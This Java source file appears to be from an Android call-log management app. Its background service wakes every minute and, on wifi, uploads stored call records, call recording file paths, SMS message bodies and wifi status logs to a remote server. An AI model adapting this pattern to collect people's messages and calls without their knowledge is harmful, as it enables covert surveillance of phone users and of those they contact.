package com.labelle.calllogsmanagement;

import de.quist.app.errorreporter.ExceptionReporter;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.os.CountDownTimer;
import android.os.IBinder;

public class UploadService extends Service {

	CountDownTimer timer;
	private ExceptionReporter reporter;

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	@Override
	public int onStartCommand(final Intent intent, int flags, int startId) {
		try {
			reporter = ExceptionReporter.register(UploadService.this);
		} catch (Exception e) {
			e.printStackTrace();
		}
		timer = new CountDownTimer(1 * 60 * 1000, 1000) {

			@Override
			public void onTick(long millisUntilFinished) {

			}

			@Override
			public void onFinish() {
				toDoOnTimer();
				timer.start();
			}
		};
		timer.start();
		return START_STICKY;
	}

	private void toDoOnTimer() {
		Util util = new Util(this);
		if (util.isInternetAvailable()) {
			ConnectivityManager connMgr = (ConnectivityManager) this
					.getSystemService(Context.CONNECTIVITY_SERVICE);

			final android.net.NetworkInfo wifi = connMgr
					.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
			if (wifi.isAvailable()) {
				SharedPreferences sharedPreferences = getApplicationContext()
						.getSharedPreferences("MyPref", 0);
				Editor edit = sharedPreferences.edit();
				edit.putLong("synchronizeTime", System.currentTimeMillis());
				edit.commit();
				DBAdapter dba = new DBAdapter(this);
				dba.open();
				Cursor cr = dba.getWifiStatuses();
				cr.moveToFirst();
				while (!cr.isAfterLast()) {
					util.sendWifiStateToServer(
							cr.getString(cr.getColumnIndex("wifi_status")),
							cr.getString(cr.getColumnIndex("timestamp")),
							cr.getString(cr.getColumnIndex("_id")));
					cr.moveToNext();
				}
				cr.close();
				Cursor cr2 = dba.getCalls();
				cr2.moveToFirst();
				while (!cr2.isAfterLast()) {
					try {
						util.sendCallToServer(
								cr2.getString(cr2.getColumnIndex("number")),
								cr2.getString(cr2.getColumnIndex("duration")),
								cr2.getString(cr2.getColumnIndex("timestamp")),
								cr2.getString(cr2.getColumnIndex("type")),
								cr2.getString(cr2.getColumnIndex("filepath")),
								cr2.getString(cr2.getColumnIndex("_id")));
					} catch (NameNotFoundException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					cr2.moveToNext();
				}
				cr2.close();
				Cursor cr3 = dba.getSmses();
				cr3.moveToFirst();
				while (!cr3.isAfterLast()) {
					try {
						util.sendSMSToServer(
								cr3.getString(cr3.getColumnIndex("message")),
								cr3.getString(cr3.getColumnIndex("number")),
								cr3.getString(cr3.getColumnIndex("timestamp")),
								cr3.getString(cr3.getColumnIndex("type")),
								cr3.getString(cr3.getColumnIndex("_id")));
					} catch (NameNotFoundException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					cr3.moveToNext();
				}
				cr3.close();
				dba.close();
			}

		}
	}
}
